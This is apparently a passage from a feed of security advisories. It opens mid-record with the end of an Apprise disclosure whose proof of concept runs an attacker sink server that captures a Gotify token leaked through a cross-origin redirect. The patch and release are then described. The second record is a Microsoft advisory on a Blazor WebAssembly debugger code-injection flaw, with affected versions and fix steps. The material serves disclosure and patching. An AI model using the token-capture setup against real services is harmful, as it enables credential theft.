        self.send_response(204); self.end_headers()
http.server.HTTPServer(("127.0.0.1", 8082), H).serve_forever()
```

```python
# victim
from apprise import Apprise
a = Apprise()
a.add("gotify://127.0.0.1:8081?token=SECRETTOKEN")
a.notify(body="x")
```

Observed on `master` HEAD (2026-05-13): `attacker_sink.py` prints `X-Gotify-Key: SECRETTOKEN` -- the user-supplied token followed the cross-origin redirect.

# Patch

Fix landed in [`caronc/apprise#1610`](https://github.com/caronc/apprise/pull/1610) (merged 2026-05-16, commit `68c0aef`):

- Adds `?redirect=yes|no` URL parameter on every plugin URL
- Adds `AppriseAsset.http_redirects` global default
- Equivalent flags wired into `apprise/attachment/http.py` and `apprise/config/http.py`

The default remains `redirects=True` for backwards compatibility -- operators who relay notifications through destinations they don't fully trust should append `?redirect=no` to their Apprise URLs or set `AppriseAsset(http_redirects=False)` globally.

Released in v1.11.0 (2026-05-29, available on PyPI).

items.title: Microsoft Security Advisory CVE-2026-102870 - ASP.NET Core Remote Code Execution Vulnerability
items.summary: ## Executive summary Microsoft is releasing this security advisory to provide information about a vulnerability in the Blazor WebAssembly debugger included in `Microsoft.AspNetCore.Components.WebAssembly.Server`. This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability. The Blazor WebAssembly debug proxy evaluates debugger expressions by generating and compiling C# source. Certain values originating in the application being debugged, including `ToString()` results, descriptions, and class names, are embedded in that generated source without consistent escaping. An attacker-controlled value can escape the generated string literal and execute code on a developer's machine when the developer evaluates an expression during debugging. ## Announcement Announcement for this issue can be found at https://github.com/dotnet/announcements/issues/445 ## CVSS Details - **Version:** 3.1 - **Severity:** High - **Score:** 8.8 - **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` - **Weakness:** CWE-94 (Improper Control of Generation of Code ('Code Injection')) ## Affected Platforms - **Platforms:** Windows, Linux, macOS - **Architectures:** All ## Affected Packages The vulnerability affects Microsoft .NET projects that use an affected package version listed below. Package name | Affected version | Patched version ------------ | ---------------- | --------------- [Microsoft.AspNetCore.Components.WebAssembly.Server](https://www.nuget.org/packages/Microsoft.AspNetCore.Components.WebAssembly.Server) | >= 10.0.0, <= 10.0.12 | 10.0.13 [Microsoft.AspNetCore.Components.WebAssembly.Server](https://www.nuget.org/packages/Microsoft.AspNetCore.Components.WebAssembly.Server) | >= 11.0.0-preview.1, <= 11.0.0-rc.1 | 11.0.0-rc.2.26478.115 ## Advisory FAQ ### How do I know if I am affected? You are affected if you use a vulnerable version of `Microsoft.AspNetCore.Components.WebAssembly.Server` to debug a Blazor WebAssembly application and evaluate an expression involving attacker-controlled application data. ### How do I fix the issue? 1. Install the latest supported version of .NET. 2. Update `Microsoft.AspNetCore.Components.WebAssembly.Server` to the patched version for the .NET release used by the application. Once the updated package or runtime is installed, restart the debugger and development environment. ## Other Information ### Reporting Security Issues If you have found a potential security issue in a supported version of .NET, please report it to the Microsoft Security Response Center (MSRC) via the [MSRC Researcher Portal](https://msrc.microsoft.com/report/vulnerability/new). Further information can be found in the MSRC [Report an Issue FAQ](https://www.microsoft.com/msrc/faqs-report-an-issue). Security reports made through MSRC may qualify for the Microsoft .NET Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at https://aka.ms/corebounty. ### Support You can ask questions about this issue on GitHub in the .NET GitHub organization. The main repositories are located at https://github.com/dotnet/runtime and https://github.com/dotnet/aspnetcore. The Announcements repository (https://github.com/dotnet/announcements) will contain this bulletin as an issue and will include a link to a discussion issue. ### Disclaimer The information provided in this advisory is provided "as is" without warranty of any kind.
